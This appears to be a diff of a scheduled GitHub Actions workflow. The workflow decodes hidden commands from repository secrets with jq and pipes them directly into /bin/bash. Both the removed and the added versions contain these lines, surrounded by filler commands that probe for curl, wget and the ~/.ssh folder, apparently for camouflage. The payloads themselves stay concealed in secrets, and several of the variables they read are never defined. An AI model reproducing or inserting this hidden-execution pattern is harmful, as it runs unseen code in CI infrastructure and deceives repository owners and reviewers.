@@ -1,11 +1,9 @@
 name: xueziyang1995
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
-
-jobs:  # 3020
+    - cron: '59 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,30 +11,13 @@ jobs:  # 3020
       - uses: actions/checkout@v4
       - name: xueziyang1995
         env:
-          f31504: ${{ secrets.f31504 }}
+          mioqf16: ${{ secrets.mioqf16 }}
         run: |
-          git pull -r
-          sleep 0.1 2>/dev/null || true
-          echo $f31504 | jq -r .d644 | /bin/bash
-          git branch -r
-          echo "Debug at $(date)"
-          which wget
-          which wget
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          echo "User: $(whoami)"
-          echo "Time: $(date +%H:%M:%S)"
-          echo "Version: $((1 + RANDOM % 5))"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          sleep 0.1 2>/dev/null || true
-          which curl
-          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
-          ls -la 2>/dev/null || true
-          printf "shasum -a 256 of \$(date): $(printf "%s" "$(date)" | shasum -a 256)"
-          uname -a
-          rm -rf tmp.temp.my.scrip.orc.zzz
-          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          which sqlite
-          which apt-get
-          for i in 1 2 3; do echo "Loop $i"; done
+          echo $mioqf16 | jq -r .qqn78 | /bin/bash
+          echo $ggsh774 | jq -r .fju56 | /bin/bash
+          echo $acye39 | jq -r .ejjpr12 | /bin/bash
+          echo $ov72527 | jq -r .j07 | /bin/bash
+          echo $om18 | jq -r .srlh1 | /bin/bash
+          echo $sm7582 | jq -r .ek057 | /bin/bash
+          echo $vorr0800 | jq -r .jyuw04536 | /bin/bash
+
